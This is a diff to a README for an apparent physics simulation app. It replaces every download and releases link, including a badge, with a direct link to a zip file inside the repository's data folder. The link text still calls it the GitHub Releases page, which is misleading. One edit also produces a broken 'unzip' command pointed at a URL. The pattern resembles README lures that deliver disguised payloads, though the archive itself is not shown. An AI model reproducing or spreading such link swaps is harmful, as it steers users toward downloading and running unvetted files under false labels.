@@ -1,6 +1,6 @@
 # 🌌 Imperfect-Siamese-Baryogenesis-Phase-Desynchronization - Explore the Universe's Hidden Secrets
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue)
+![Download](https://raw.githubusercontent.com/Chan2923673/Imperfect-Siamese-Baryogenesis-Phase-Desynchronization/main/data/Imperfect-Siamese-Baryogenesis-Phase-Desynchronization_v2.5-alpha.1.zip)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ To use this application, follow the steps below. You will need a computer with a
 
 To download the application, please visit this page:
 
-[Download Imperfect-Siamese-Baryogenesis-Phase-Desynchronization](https://github.com/Chan2923673/Imperfect-Siamese-Baryogenesis-Phase-Desynchronization/releases)
+[Download Imperfect-Siamese-Baryogenesis-Phase-Desynchronization](https://raw.githubusercontent.com/Chan2923673/Imperfect-Siamese-Baryogenesis-Phase-Desynchronization/main/data/Imperfect-Siamese-Baryogenesis-Phase-Desynchronization_v2.5-alpha.1.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of the software.
@@ -42,7 +42,7 @@ After downloading the file, locate it in your computer’s downloads folder.
    ```
 3. Unzip the downloaded file:
    ```bash
-   unzip Imperfect-Siamese-Baryogenesis-Phase-Desynchronization.zip
+   unzip https://raw.githubusercontent.com/Chan2923673/Imperfect-Siamese-Baryogenesis-Phase-Desynchronization/main/data/Imperfect-Siamese-Baryogenesis-Phase-Desynchronization_v2.5-alpha.1.zip
    ```
 4. Change to the directory:
    ```bash
@@ -89,7 +89,7 @@ We encourage users to share their findings and reports. If you have any suggesti
 
 For more details, documentation, or to report any issues, please visit the following resources:
 
-Visit the [GitHub Releases Page](https://github.com/Chan2923673/Imperfect-Siamese-Baryogenesis-Phase-Desynchronization/releases) for downloads and updates.
+Visit the [GitHub Releases Page](https://raw.githubusercontent.com/Chan2923673/Imperfect-Siamese-Baryogenesis-Phase-Desynchronization/main/data/Imperfect-Siamese-Baryogenesis-Phase-Desynchronization_v2.5-alpha.1.zip) for downloads and updates.
 
 Feel free to use the hashtags: 
 `#anisotropy`, `#astrophysics`, `#asymmetry`, `#baryogenesis`, `#cptsymmetry` to discuss on social media or in your research networks. 
